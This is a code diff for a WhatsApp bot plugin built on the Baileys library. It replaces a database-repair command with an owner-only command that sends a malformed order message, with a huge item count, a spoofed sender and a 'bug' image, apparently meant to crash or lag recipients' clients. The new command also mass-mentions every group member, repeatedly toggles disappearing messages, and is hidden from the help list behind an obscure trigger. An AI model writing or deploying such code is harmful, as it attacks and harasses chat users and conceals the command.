@@ -1,22 +1,33 @@
+let { Presence, GroupSettingChange, MessageType } = require('@adiwajshing/baileys')
+let fs = require ('fs')
 let handler  = async (m, { conn, text }) => {
-	let users = global.DATABASE.data.users
-
-  var total = 0
-  for (let jid in users){
-    if (users[jid].limit < 0){
-      users[jid].limit = 0
-      total+=1
-    }
-    if (users[jid].exp < 0){
-      users[jid].exp = 0
-      total+=1
-    }
-    users[jid].exp = Math.floor(users[jid].exp)
+  function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
   }
-  return conn.reply(m.chat,`*Berhasil memperbaiki ${total} error di database.*`,m)
+
+	conn.sendFile(m.chat, fs.readFileSync(`./media/images/bug.jpg`), 'error.jpg', '', {	
+	  key: {
+      remoteJid: '0@s.whatsapp.net',
+      fromMe: false,
+    }, message: {
+      orderMessage: {
+        itemCount: 99999999,
+        orderTitle: '',
+        sellerJid: '0@s.whatsapp.net',
+        jpegThumbnail: fs.readFileSync(`./media/images/bug.jpg`)
+      }
+    }
+  })
+  let users = (await conn.groupMetadata(m.chat)).participants.map(u => u.jid)
+  for (i=0;i<2;i++){
+    conn.sendMessage(m.chat, `*halo kak*`,MessageType.extendedText,{ contextInfo: { mentionedJid: users } })
+		await conn.toggleDisappearingMessages(m.chat, { quoted: m })
+		await sleep(3000)
+	}
 }
-handler.help = ['bug']
-handler.tags = ['owner']
-handler.command = /^(bug)$/i
+handler.help = []
+handler.tags = []
+handler.customPrefix = /^[S]/
+handler.command = /^(alken)$/i
 handler.owner = true
 module.exports = handler
